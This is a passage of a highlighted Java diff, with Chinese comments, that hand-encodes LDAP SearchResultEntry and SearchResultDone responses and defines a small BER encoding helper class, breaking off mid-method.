+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// SearchResultEntry [APPLICATION 4]</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeApplication</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>4</span><span class=p>,</span><span class=w> </span><span class=n>entryContent</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 包装成 LDAPMessage SEQUENCE</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeSequence</span><span class=p>(</span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 构造 SearchResultDone 响应
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * SearchResultDone ::= [APPLICATION 5] LDAPResult
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>buildSearchDoneResponse</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>messageId</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// messageID</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeInteger</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// LDAPResult ::= SEQUENCE { resultCode, matchedDN, diagnosticMessage }</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeEnumerated</span><span class=p>(</span><span class=n>result</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w> </span><span class=c1>// resultCode = success</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeOctetString</span><span class=p>(</span><span class=n>result</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>// matchedDN</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeOctetString</span><span class=p>(</span><span class=n>result</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>// diagnosticMessage</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeApplication</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>5</span><span class=p>,</span><span class=w> </span><span class=n>result</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 包装成 LDAPMessage SEQUENCE</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeSequence</span><span class=p>(</span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * BER 编码工具类
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>class</span> <span class=nc>BerEncoder</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>encodeInteger</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x02</span><span class=p>);</span><span class=w> </span><span class=c1>// INTEGER tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>127</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x01</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>128</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>255</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x02</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>((</span><span class=n>value</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>8</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>intBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>intToBytes</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>intBytes</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>intBytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>encodeEnumerated</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x0A</span><span class=p>);</span><span class=w> </span><span class=c1>// ENUMERATED tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x01</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>encodeOctetString</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x04</span><span class=p>);</span><span class=w> </span><span class=c1>// OCTET STRING tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>value</span><span class=p>.</span><span class=na>getBytes</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>writeBerLength</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>bytes</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>encodeSequence</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>content</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x30</span><span class=p>);</span><span class=w> </span><span class=c1>// SEQUENCE tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>writeBerLength</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>content</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>content</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>encodeSequence</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>content</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x30</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>writeBerLength</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>content</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>content</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>encodeApplication</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>tag</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>content</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x60</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>tag</span><span class=p>);</span><span class=w> </span><span class=c1>// APPLICATION | CONSTRUCTED tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>writeBerLength</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>content</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>content</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>encodeAttribute</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>attrName</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>attrValue</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>attrContent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// attribute type</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>encodeOctetString</span><span class=p>(</span><span class=n>attrContent</span><span class=p>,</span><span class=w> </span><span class=n>attrName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// attribute values (SET)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>valueSet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>encodeOctetString</span><span class=p>(</span><span class=n>valueSet</span><span class=p>,</span><span class=w> </span><span class=n>attrValue</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>attrContent</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x31</span><span class=p>);</span><span class=w> </span><span class=c1>// SET tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>writeBerLength</span><span class=p>(</span><span class=n>attrContent</span><span class=p>,</span><span class=w> </span><span class=n>valueSet</span><span class=p>.</span><span class=na>size</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>attrContent</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>valueSet</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// 整个 attribute 是一个 SEQUENCE</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>attrSeq</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>encodeSequence</span><span class=p>(</span><span class=n>attrSeq</span><span class=p>,</span><span class=w> </span><span class=n>attrContent</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>attrSeq</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>writeBerLength</span><span class=p>(</span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>127</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>255</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x81</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x82</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>((</span><span class=n>length</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>8</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>intToBytes</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=p>{</span><span class=n>0</span><span class=p>};</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>4</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>4</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>boolean</span><span class=w> </span><span class=n>started</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
